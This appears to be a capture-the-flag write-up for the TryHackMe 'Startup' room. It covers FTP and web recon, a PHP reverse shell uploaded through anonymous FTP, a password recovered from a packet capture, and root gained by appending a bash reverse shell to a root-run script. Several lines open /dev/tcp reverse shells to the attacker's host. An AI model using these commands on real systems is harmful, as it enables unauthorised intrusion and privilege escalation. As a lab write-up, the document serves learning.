---
title: Startup
date: 2026-10-14
difficulty: Easy
os: Linux
summary: Anonymous writable FTP served over HTTP gives a www-data shell; a leaked password in a pcap gives lennie, and a lennie-owned script called by a root job gives root.
room: https://tryhackme.com/room/startup
---

## Recon

I started with an nmap scan of the target:

```bash
nmap -sV -sC -oN basic.nmap 10.128.184.74
```

![nmap scan](writeups/img/startup-1.png)

Ports 21, 22 and 80 are open, so there's a webpage on the host plus FTP and SSH. Nmap also confirmed that FTP allows anonymous login, so it was worth checking for interesting data there.

I added `challenge.thm` to `/etc/hosts` and started a gobuster scan against the website:

```bash
gobuster dir -u challenge.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x pdf,html,js,txt
```

While it was running I checked the anonymous FTP server. There were some files, but nothing interesting. Then the gobuster results came back with a `/files` path on the webpage. When I opened it, I saw it was the same directory I could access over FTP.

![gobuster scan](writeups/img/startup-2.png)

## Foothold

That meant I could upload a file over FTP and then run it through the website, so planting a reverse shell payload there should work. I generated a PHP payload with msfvenom:

```bash
msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw > revshell.php
```

I started a listener on my end, uploaded the file through the anonymous FTP connection, and then opened it in the browser:

```bash
nc -lvnp 4444
```

```
http://<TARGET_IP>/files/ftp/revshell.php
```

The connection came through, but the payload didn't give me a proper shell. So I started a second listener and sent a bash reverse shell from the connection I already had:

```bash
nc -lvnp 4445
```

```bash
bash -c '/bin/bash -i >& /dev/tcp/<IP>/4445 0>&1'
```

> **Mistake:** `php/reverse_php` connects back but doesn't give you an interactive shell. I only got a usable session after using it to launch a separate bash reverse shell.

I stabilised the shell:

```bash
python -c "import pty;pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows <ROWS> cols <COLS>
```

With a stable shell, I started poking around the box for files, data and privilege escalation paths. Eventually two things in `/` stood out. Both were owned by `www-data`, so I could read them. `recipe.txt` had the recipe flag, and the `incidents` folder held a `suspicious.pcapng` file.

![www-data owned files in /](writeups/img/startup-3.png)

## Privilege escalation

### www-data → lennie

I read the flag and then transferred the pcap file to my machine by serving it from inside the `incidents` folder:

```bash
python3 -m http.server
```

Skimming the capture, I filtered for HTTP requests and found that someone else had used the same revshell approach through the website. Their payload connected back on port 4444, so I filtered for that port and used Wireshark's Follow TCP Stream to read their commands in plaintext:

```
tcp.port == 4444
```

Most of it was basic enumeration like `hostname` and `id`. Then they ran `sudo -l`, the system asked for a password, and they typed one in. It sat right there in the stream in plaintext.

![Follow TCP Stream in Wireshark](writeups/img/startup-4.png)

I copied the password and tried it for the only non-root user I had found on the machine, `lennie`, over SSH. It worked:

```bash
ssh lennie@<TARGET_IP>
# password: [redacted]
```

### lennie → root

The user flag was in lennie's home directory, next to a `scripts` folder with `planner.sh` and `startup_list.txt`, both owned by root. `planner.sh` calls `/etc/print.sh`:

![scripts folder](writeups/img/startup-5.png)

A script sitting in a scripts folder made me think something was running it automatically behind the scenes. And `/etc/print.sh` is owned by lennie, so I could edit it:

![/etc/print.sh permissions](writeups/img/startup-6.png)

> **Tip:** I couldn't find any crontab jobs in the places I had access to, but a root-owned script calling a file I can write to was enough reason to assume it runs on a schedule and try it.

I added a reverse shell to `/etc/print.sh`, set up a listener, and waited while I looked for anything else of interest:

```bash
echo "bash -c '/bin/bash -i >& /dev/tcp/<IP>/4446 0>&1'" >> /etc/print.sh
nc -lvnp 4446
```

It fired right away, before I could look at anything else, and dropped me into a root shell. I read the root flag, and that wrapped up this THM challenge.

## Flags

recipe.txt — hidden
user.txt — THM{hidden}
root.txt — THM{hidden}
